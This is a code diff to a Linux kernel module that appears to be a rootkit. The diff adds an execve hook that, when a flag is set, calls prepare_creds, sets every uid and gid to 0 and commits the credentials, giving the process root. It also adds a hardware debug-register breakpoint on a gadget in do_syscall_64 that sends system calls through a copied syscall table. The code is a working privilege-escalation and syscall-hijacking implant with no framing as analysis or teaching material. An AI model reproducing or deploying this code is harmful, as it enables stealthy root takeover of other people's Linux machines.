@@ -1,11 +1,36 @@
 #include "syscall_table.h"
 #include "hook.h"
+#include "dr_breakpoints.h"
 
-#define SYSCALL(sys, args...) ((long(*)())sct[__NR_##sys])(args)
+typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+
+#define SYSCALL(sys) (t_syscall)sct[__NR_##sys]
 #define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func
 
 static unsigned long fake_sct[320];
 static unsigned long *sct;
+
+/* set root escalation flag */
+int is_root = 0;
+
+static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
+{
+  if (is_root == 1) {
+
+	/* generating root permissions */
+	struct cred *np;
+	np = prepare_creds();
+
+	np->uid.val = np->gid.val = 0;
+	np->euid.val = np->egid.val = 0;
+	np->suid.val = np->sgid.val = 0;
+	np->fsuid.val = np->fsgid.val = 0;
+
+	/* commit creds to task_struct of current process */
+	commit_creds(np);
+  }
+  return (int)SYSCALL(execve);
+}
 
 /*
  * rax -> fake_sct index
@@ -16,11 +41,8 @@ void patch_rax_reg(struct pt_regs *regs)
   regs->ax += off / sizeof(unsigned long);
 }
 
-
-
 int hook_syscall_table(void)
 {
-  int ret;
   unsigned long gd_addr;
 
   table_ptr = sys_call_table_retrieve();
@@ -29,20 +51,19 @@ int hook_syscall_table(void)
 	return -1;
 
   memcpy(fake_sct, sct, sizeof(fake_sct));
-  
-  unsigned long call_sys_addr = get_syscall_64_addr();
 
+  HOOK(execve, new_sys_execve);
+
+  unsigned long call_sys_addr = get_syscall_64_addr();
   if (!call_sys_addr)
 	return -ENXIO; // set errno to "no such device or address"
-
-  debug_print("do_syscall_64 is at address %p", (void *)call_sys_addr);
-
   gd_addr = get_gadget_addr((void *)call_sys_addr);
-
   if (!gd_addr)
 	return -ENXIO; // set errno to "no such device or address"
 
   debug_print("Setting breakpoint at address %p", (void *)gd_addr);
+
+  reg_dr_breakpoint(gd_addr, DR_RW_X, 0);
 
   return 0;
 }
